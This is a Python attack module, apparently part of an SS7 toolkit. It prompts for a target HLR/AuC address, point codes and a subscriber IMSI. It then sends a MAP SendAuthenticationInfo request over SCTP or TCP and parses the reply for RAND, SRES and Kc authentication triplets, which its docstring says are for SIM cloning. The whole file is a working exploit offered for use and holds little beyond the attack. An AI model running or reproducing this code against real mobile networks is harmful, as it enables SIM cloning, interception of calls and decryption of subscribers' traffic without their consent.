#!/usr/bin/env python
"""
SendAuthenticationInfo (SAI) Attack Module
Uses proper MAP ASN.1 encoding.
Retrieves authentication vectors (Rand/SRES/Kc) for SIM cloning.
Supports both SCTP (raw) and TCP transport.
"""
import sys
import os
from scapy.all import *

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import SendAuthenticationInfo

def sai_main():
    print("\n" + "=" * 50)
    print(" SendAuthenticationInfo (SAI) Attack")
    print(" Retrieve Authentication Vectors (Rand/SRES/Kc)")
    print("=" * 50 + "\n")
    
    print("\033[33m[!] WARNING: Stolen auth vectors enable SIM cloning & traffic decryption!\033[0m\n")

    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target IP (HLR/AuC)", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "666"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    print("\n[3] Attack Parameters")
    print("-" * 30)
    target_imsi = get_input("Target IMSI", "286011234567890", validator=validate_imsi)
    num_vectors = int(get_input("Number of Vectors (1-5)", "5"))
    
    print("\n" + "=" * 50)
    print(" Building MAP SendAuthenticationInfo Message")
    print("=" * 50)
    
    sai = SendAuthenticationInfo(target_imsi, num_vectors)
    tcap_data = sai.to_tcap_begin()
    
    print(f"[+] Target IMSI: {target_imsi}")
    print(f"[+] Requested Vectors: {num_vectors}")
    print(f"[+] MAP Operation: SendAuthenticationInfo (OpCode: 56)")
    print(f"[+] TCAP Message Size: {len(tcap_data)} bytes")

    # Transport selection
    print("\n[+] Transport Selection:")
    print("    1) SCTP (raw - requires root/Linux)")
    print("    2) TCP  (works everywhere)")
    transport = get_input("Transport mode", "2")

    if transport == "1":
        _sctp_sai(remote_ip, remote_port, opc, dpc, tcap_data)
    else:
        _tcp_sai(remote_ip, remote_port, opc, dpc, tcap_data)

    input("\nPress Enter to return...")


def _sctp_sai(remote_ip, remote_port, opc, dpc, tcap_data):
    """SCTP transport."""
    print(f"\n[+] Sending to {remote_ip}:{remote_port} (SCTP)...")
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=5, verbose=0)
        
        if ans and ans.haslayer(SCTPChunkInitAck):
            print("[+] SCTP Connection established!")
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            data_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            map_ans = sr1(data_pkt, timeout=5, verbose=0)
            if map_ans and map_ans.haslayer(Raw):
                print("\n[+] Response received!")
                _parse_sai_response(map_ans[Raw].load)
            else:
                print("[-] No MAP response (timeout)")
        else:
            print("[-] SCTP failed. Trying TCP fallback...")
            _tcp_sai(remote_ip, remote_port, opc, dpc, tcap_data)
    except Exception as e:
        print(f"[-] SCTP Error: {e}")
        print("[*] Trying TCP fallback...")
        _tcp_sai(remote_ip, remote_port, opc, dpc, tcap_data)


def _tcp_sai(remote_ip, remote_port, opc, dpc, tcap_data):
    """TCP transport fallback."""
    print("\n[+] Using TCP Transport...")
    try:
        from ss7.attacks.tcp_transport import tcp_attack
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from tcp_transport import tcp_attack

    result = tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data, called_ssn=6)

    print("\n" + "=" * 50)
    print(" SendAuthenticationInfo Result")
    print("=" * 50)
    if result.get('success'):
        print("\033[32m[+] Response received!\033[0m")
        if result.get('map_error'):
            print(f"\033[31m[-] MAP Error: {result['map_error']} ({result.get('map_error_name', '')})\033[0m")
        else:
            print("\033[32m[+] Auth vectors may be in the response data.\033[0m")
            if result.get('raw'):
                _parse_sai_response(result['raw'])
    else:
        print(f"\033[31m[-] {result.get('error', 'Unknown error')}\033[0m")


def _parse_sai_response(data):
    """Parse SAI response for authentication vectors."""
    print("\n[+] SAI Response Analysis:")
    print(f"[+] Response Size: {len(data)} bytes")
    print("[+] Raw Response (Hex):")
    for i in range(0, min(len(data), 128), 16):
        hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
        print(f"    {hex_part}")
    
    # Each authentication triplet: RAND(16) + SRES(4) + Kc(8) = 28 bytes
    if len(data) > 28:
        print("\n\033[32m[+] Potential auth triplets detected!\033[0m")
        print("[*] RAND = 16 bytes, SRES = 4 bytes, Kc = 8 bytes")
        # Try to find triplet sequences
        for i in range(len(data) - 28):
            if data[i] == 0x04 and data[i+1] == 0x10:  # OCTET STRING, length 16
                rand_hex = ' '.join(f'{b:02x}' for b in data[i+2:i+18])
                print(f"\n    Possible RAND: {rand_hex}")
                if i + 18 + 6 < len(data):
                    sres_hex = ' '.join(f'{b:02x}' for b in data[i+18:i+22])
                    kc_hex = ' '.join(f'{b:02x}' for b in data[i+22:i+30])
                    print(f"    Possible SRES: {sres_hex}")
                    print(f"    Possible Kc:   {kc_hex}")


if __name__ == "__main__":
    sai_main()
